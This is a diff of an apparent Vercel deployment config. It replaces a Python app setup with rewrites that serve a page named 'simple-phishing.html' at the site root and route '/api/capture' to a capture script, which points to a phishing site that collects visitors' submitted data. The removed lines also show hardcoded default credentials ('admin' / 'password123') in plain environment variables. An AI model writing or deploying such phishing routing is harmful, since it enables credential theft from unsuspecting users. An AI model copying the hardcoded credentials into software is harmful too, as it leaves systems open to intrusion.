@@ -1,20 +1,6 @@
 {
-  "version": 2,
-  "builds": [
-    {
-      "src": "api/index.py",
-      "use": "@vercel/python"
-    }
-  ],
-  "routes": [
-    {
-      "src": "/(.*)",
-      "dest": "api/index.py"
-    }
-  ],
-  "env": {
-    "SF_USER": "admin",
-    "SF_PASS": "password123",
-    "VERCEL": "1"
-  }
+  "rewrites": [
+    { "source": "/", "destination": "/simple-phishing.html" },
+    { "source": "/api/capture", "destination": "/api/capture.js" }
+  ]
 }
